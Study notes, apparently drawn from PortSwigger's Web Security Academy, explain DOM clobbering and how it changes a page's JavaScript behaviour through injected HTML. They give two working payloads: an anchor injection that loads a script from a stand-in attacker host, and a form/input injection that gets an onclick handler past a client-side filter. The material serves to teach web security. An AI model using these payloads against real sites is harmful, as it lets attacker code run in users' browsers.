
----

- DOM clobbering is a technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the page.
	- DOM clobbering is particularly useful in cases where [XSS](https://portswigger.net/web-security/cross-site-scripting) is not possible, but you can control some HTML on a page where the attributes `id` or `name` are whitelisted by the HTML filter.
		-  Anchor element to overwrite a global variable

### How to exploit DOM-clobbering vulnerabilities

A common pattern used by JavaScript developers is:

`var someObject = window.someObject || {};`

If you can control some of the HTML on the page, you can clobber the `someObject` reference with a DOM node, such as an anchor. Consider the following code:

`<script> window.onload = function(){ let someObject = window.someObject || {}; let script = document.createElement('script'); script.src = someObject.url; document.body.appendChild(script); }; </script>`

To exploit this vulnerable code, you could inject the following HTML to clobber the `someObject` reference with an anchor element:

`<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>`

As the two anchors use the same ID, the DOM groups them together in a DOM collection. The DOM clobbering vector then overwrites the `someObject` reference with this DOM collection. A `name` attribute is used on the last anchor element in order to clobber the `url` property of the `someObject` object, which points to an external script. 

- Another common technique is to use a `form` element along with an element such as `input` to clobber DOM properties. For example, clobbering the `attributes` property enables you to bypass client-side filters that use it in their logic. Although the filter will enumerate the `attributes` property, it will not actually remove any attributes because the property has been clobbered with a DOM node. As a result, you will be able to inject malicious attributes that would normally be filtered out. For example, consider the following injection:

`<form onclick=alert(1)><input id=attributes>Click me`

In this case, the client-side filter would traverse the DOM and encounter a whitelisted `form` element. Normally, the filter would loop through the `attributes` property of the `form` element and remove any blacklisted attributes. However, because the `attributes` property has been clobbered with the `input` element, the filter loops through the `input` element instead. As the `input` element has an undefined length, the conditions for the `for` loop of the filter (for example `i<element.attributes.length`) are not met, and the filter simply moves on to the next element instead. This results in the `onclick` event being ignored altogether by the filter, which subsequently allows the `alert()` function to be called in the browser.

